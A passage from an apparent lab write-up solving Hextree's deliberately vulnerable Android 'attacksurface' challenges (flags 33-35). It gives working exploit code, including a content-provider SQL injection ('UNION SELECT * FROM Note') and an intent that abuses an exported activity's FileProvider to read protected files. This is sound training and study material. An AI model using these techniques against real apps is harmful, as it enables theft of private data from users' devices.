</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=n>intent</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>	    </span><span class=n>startActivity</span><span class=p>(</span><span class=n>intent</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>This creates an implicit intent with action <code>"io.hextree.FLAG33"</code> and data to the second provider</p><h4 class="relative group">Solution<div id=solution-4 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-4 aria-label=Anchor>#</a></span></h4><p>same payload as <code>flag33_1</code> but we will create a filter for the action</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;activity</span>  
</span></span><span class=line><span class=cl>    <span class=na>android:name=</span><span class=s>&#34;.Providers&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span> <span class=nt>&gt;</span>  
</span></span><span class=line><span class=cl>    <span class=nt>&lt;intent-filter&gt;</span>        
</span></span><span class=line><span class=cl>	    <span class=nt>&lt;action</span> <span class=na>android:name=</span><span class=s>&#34;io.hextree.FLAG33&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl>        <span class=nt>&lt;category</span> <span class=na>android:name=</span><span class=s>&#34;android.intent.category.DEFAULT&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl>        <span class=nt>&lt;data</span> <span class=na>android:scheme=</span><span class=s>&#34;content&#34;</span> <span class=na>android:host=</span><span class=s>&#34;io.hextree.flag33_2&#34;</span> <span class=nt>/&gt;</span>  
</span></span><span class=line><span class=cl>    <span class=nt>&lt;/intent-filter&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/activity&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Intent</span><span class=w> </span><span class=n>intent_33</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>intent_33</span><span class=p>.</span><span class=na>getAction</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>&amp;</span><span class=w> </span><span class=s>&#34;io.hextree.FLAG33&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>getIntent</span><span class=p>().</span><span class=na>getAction</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Cursor</span><span class=w> </span><span class=n>cursor</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>query</span><span class=p>(</span><span class=n>intent_33</span><span class=p>.</span><span class=na>getData</span><span class=p>(),</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;name&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;value&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;visible&#34;</span><span class=p>},</span><span class=w> </span><span class=s>&#34;_id = 2 UNION SELECT  * FROM Note&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToFirst</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>do</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>StringBuilder</span><span class=w> </span><span class=n>sb</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>StringBuilder</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnCount</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>sb</span><span class=p>.</span><span class=na>length</span><span class=p>()</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=s>&#34;, &#34;</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>sb</span><span class=p>.</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getColumnName</span><span class=p>(</span><span class=n>i</span><span class=p>)).</span><span class=na>append</span><span class=p>(</span><span class=s>&#34; = &#34;</span><span class=p>).</span><span class=na>append</span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>getString</span><span class=p>(</span><span class=n>i</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;evil&#34;</span><span class=p>,</span><span class=w> </span><span class=n>sb</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>cursor</span><span class=p>.</span><span class=na>moveToNext</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 34<div id=flag-34 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-34 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-5 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl> <span class=nt>&lt;activity</span>
</span></span><span class=line><span class=cl>	<span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.activities.Flag34Activity&#34;</span>
</span></span><span class=line><span class=cl>	<span class=na>android:exported=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><p>The activity is exported so we can interact with it from our app</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>bundle</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>bundle</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>stringExtra</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>().</span><span class=na>getStringExtra</span><span class=p>(</span><span class=s>&#34;filename&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stringExtra</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>prepareFlag</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=n>stringExtra</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Uri</span><span class=w> </span><span class=n>uriForFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FileProvider</span><span class=p>.</span><span class=na>getUriForFile</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.files&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=n>stringExtra</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>uriForFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>setResult</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>intent</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Uri</span><span class=w> </span><span class=n>uriForFile2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FileProvider</span><span class=p>.</span><span class=na>getUriForFile</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.files&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;secret.txt&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intent</span><span class=w> </span><span class=n>intent2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>uriForFile2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setResult</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>intent2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=nf>prepareFlag</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=s>&#34;flag34.txt&#34;</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=n>str</span><span class=p>).</span><span class=na>exists</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>LogHelper</span><span class=w> </span><span class=n>logHelper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LogHelper</span><span class=p>(</span><span class=n>context</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>logHelper</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;file-provider&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>logHelper</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;flag34&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Utils</span><span class=p>.</span><span class=na>writeFile</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flags/flag34.txt&#34;</span><span class=p>,</span><span class=w> </span><span class=n>logHelper</span><span class=p>.</span><span class=na>appendLog</span><span class=p>(</span><span class=n>FLAG</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>when it receives an intent it checks for string data under name <code>filename</code> and if it&rsquo;s null a preset uri to a file is used <code>content://io.hextree.files/secret.txt</code> and if there is data the uri will be created with the authority and out input name But which do we what to right?
the method used to prepare the flag suggests that it takes the flag from somewhere and then write it into <code>flags/flag34.txt</code></p><h4 class="relative group">Solution<div id=solution-5 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#solution-5 aria-label=Anchor>#</a></span></h4><p>we need to access <code>flags/flag34.txt</code> and so we will add it under <code>filename</code> and since their is a result that is being set so we will use <code>startActivityForResult()</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>intent</span><span class=p>.</span><span class=na>putExtra</span><span class=p>(</span><span class=s>&#34;filename&#34;</span><span class=p>,</span><span class=s>&#34;flags/flag34.txt&#34;</span><span class=p>);</span><span class=w> </span><span class=c1>//you want secret so dont use it  </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>intent</span><span class=p>.</span><span class=na>setComponent</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>ComponentName</span><span class=p>(</span><span class=s>&#34;io.hextree.attacksurface&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.attacksurface.activities.Flag34Activity&#34;</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>startActivityForResult</span><span class=p>(</span><span class=n>intent</span><span class=p>,</span><span class=n>1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>requestCode</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;Hextree&#34;</span><span class=p>,</span><span class=s>&#34;URI: &#34;</span><span class=o>+</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>().</span><span class=na>toString</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>InputStream</span><span class=w> </span><span class=n>inputStream</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getContentResolver</span><span class=p>().</span><span class=na>openInputStream</span><span class=p>(</span><span class=n>data</span><span class=p>.</span><span class=na>getData</span><span class=p>());</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>BufferedReader</span><span class=w> </span><span class=n>reader</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>BufferedReader</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>InputStreamReader</span><span class=p>(</span><span class=n>inputStream</span><span class=p>));</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>line</span><span class=w> </span><span class=p>;</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>line</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>reader</span><span class=p>.</span><span class=na>readLine</span><span class=p>())</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Log</span><span class=p>.</span><span class=na>d</span><span class=p>(</span><span class=s>&#34;File&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;[*]&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>line</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>FileNotFoundException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>RuntimeException</span><span class=p>(</span><span class=n>e</span><span class=p>);</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>  
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><h3 class="relative group">Flag 35<div id=flag-35 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#flag-35 aria-label=Anchor>#</a></span></h3><h4 class="relative group">Code analysis<div id=code-analysis-6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href=#code-analysis-6 aria-label=Anchor>#</a></span></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl> <span class=nt>&lt;provider</span>
</span></span><span class=line><span class=cl>            <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.providers.Flag35FileProvider&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:exported=</span><span class=s>&#34;false&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:authorities=</span><span class=s>&#34;io.hextree.root&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:grantUriPermissions=</span><span class=s>&#34;true&#34;</span><span class=nt>&gt;</span>
</span></span><span class=line><span class=cl>            <span class=nt>&lt;meta-data</span>
</span></span><span class=line><span class=cl>                <span class=na>android:name=</span><span class=s>&#34;android.support.FILE_PROVIDER_PATHS&#34;</span>
</span></span><span class=line><span class=cl>                <span class=na>android:resource=</span><span class=s>&#34;@xml/rootpaths&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl>        <span class=nt>&lt;/provider&gt;</span>
</span></span></code></pre></div><p>the provider isn&rsquo;t exported but is has uri permissions and it&rsquo;s authority as <code>io.hextree.root</code> and there are some paths defined somewhere</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;paths&gt;</span>
</span></span><span class=line><span class=cl>    <span class=nt>&lt;root-path</span>
</span></span><span class=line><span class=cl>        <span class=na>name=</span><span class=s>&#34;root_files&#34;</span>
</span></span><span class=line><span class=cl>        <span class=na>path=</span><span class=s>&#34;/&#34;</span><span class=nt>/&gt;</span>
</span></span><span class=line><span class=cl><span class=nt>&lt;/paths&gt;</span>
</span></span></code></pre></div><p>so the root directory for this provider is the root directory <code>/</code> and it has an alias <code>root_files</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=nt>&lt;activity</span>
</span></span><span class=line><span class=cl>            <span class=na>android:name=</span><span class=s>&#34;io.hextree.attacksurface.activities.Flag34Activity&#34;</span>
</span></span><span class=line><span class=cl>            <span class=na>android:exported=</span><span class=s>&#34;true&#34;</span><span class=nt>/&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>  </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>onCreate</span><span class=p>(</span><span class=n>Bundle</span><span class=w> </span><span class=n>bundle</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>super</span><span class=p>.</span><span class=na>onCreate</span><span class=p>(</span><span class=n>bundle</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>stringExtra</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getIntent</span><span class=p>().</span><span class=na>getStringExtra</span><span class=p>(</span><span class=s>&#34;filename&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>stringExtra</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>prepareFlag</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=n>stringExtra</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Uri</span><span class=w> </span><span class=n>uriForFile</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FileProvider</span><span class=p>.</span><span class=na>getUriForFile</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.root&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=n>stringExtra</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Intent</span><span class=w> </span><span class=n>intent</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>uriForFile</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>intent</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>setResult</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>intent</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Uri</span><span class=w> </span><span class=n>uriForFile2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>FileProvider</span><span class=p>.</span><span class=na>getUriForFile</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;io.hextree.root&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;secret.txt&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Intent</span><span class=w> </span><span class=n>intent2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Intent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>setData</span><span class=p>(</span><span class=n>uriForFile2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>intent2</span><span class=p>.</span><span class=na>addFlags</span><span class=p>(</span><span class=n>3</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setResult</span><span class=p>(</span><span class=o>-</span><span class=n>1</span><span class=p>,</span><span class=w> </span><span class=n>intent2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kt>void</span><span class=w> </span><span class=nf>prepareFlag</span><span class=p>(</span><span class=n>Context</span><span class=w> </span><span class=n>context</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>str</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>str</span><span class=p>.</span><span class=na>contains</span><span class=p>(</span><span class=s>&#34;flag35.txt&#34;</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=p>(</span><span class=n>getFilesDir</span><span class=p>(),</span><span class=w> </span><span class=n>str</span><span class=p>).</span><span class=na>exists</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>LogHelper</span><span class=w> </span><span class=n>logHelper</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>LogHelper</span><span class=p>(</span><span class=n>context</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>logHelper</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;flag35&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>logHelper</span><span class=p>.</span><span class=na>addTag</span><span class=p>(</span><span class=s>&#34;root-provider&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Utils</span><span class=p>.</span><span class=na>writeFile2</span><span class=p>(</span><span class=k>this</span><span class=p>,</span><span class=w> </span><span class=s>&#34;flag35.txt&#34;</span><span class=p>,</span><span class=w> </span><span class=n>logHelper</span><span class=p>.</span><span class=na>appendLog</span><span class=p>(</span><span class=n>FLAG</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
